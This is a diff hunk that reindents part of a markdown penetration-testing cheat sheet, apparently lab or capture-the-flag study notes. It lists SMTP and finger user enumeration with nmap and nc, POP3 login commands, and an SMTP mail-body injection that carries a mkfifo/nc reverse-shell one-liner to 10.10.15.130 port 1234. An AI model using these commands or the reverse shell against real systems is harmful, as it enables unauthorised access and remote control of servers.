@@ -101,28 +101,28 @@
 	  - `nv $IP $PORT`
 	  - `nmap --script=smtp-* $IP -p25`
 - Enumerate Users via Finger
-  - NC
-	  - `nc $IP 79`
-	  - `admin`
-	  - `root`
-		
-	- Mail Hacking Tools
-		- POP3
-			- `telnet $IP 110`
-			- `USER $USERNAME`
-			- `PASS $PASSWORD`
-			- `LIST`
-			- `RETR 1`
+	- NC
+		- `nc $IP 79`
+		- `admin`
+		- `root`
 
-		- SMTP
-			- `VRFY root`
-			- `VRFY idontexist`
-			- `EHLO someone@mydomain`
-			- `MAIL FROM: <'@mydomain>`
-			- `DATA`
-			- `FROM: someone@mydomain`
-			- `' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.130 1234 >/tmp/f .`
-			- `quit`
+	- Mail Hacking Tools
+	- POP3
+		- `telnet $IP 110`
+		- `USER $USERNAME`
+		- `PASS $PASSWORD`
+		- `LIST`
+		- `RETR 1`
+
+	- SMTP
+		- `VRFY root`
+		- `VRFY idontexist`
+		- `EHLO someone@mydomain`
+		- `MAIL FROM: <'@mydomain>`
+		- `DATA`
+		- `FROM: someone@mydomain`
+		- `' rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.130 1234 >/tmp/f .`
+		- `quit`
 
 ### Web Server
 - Scanning Web Server
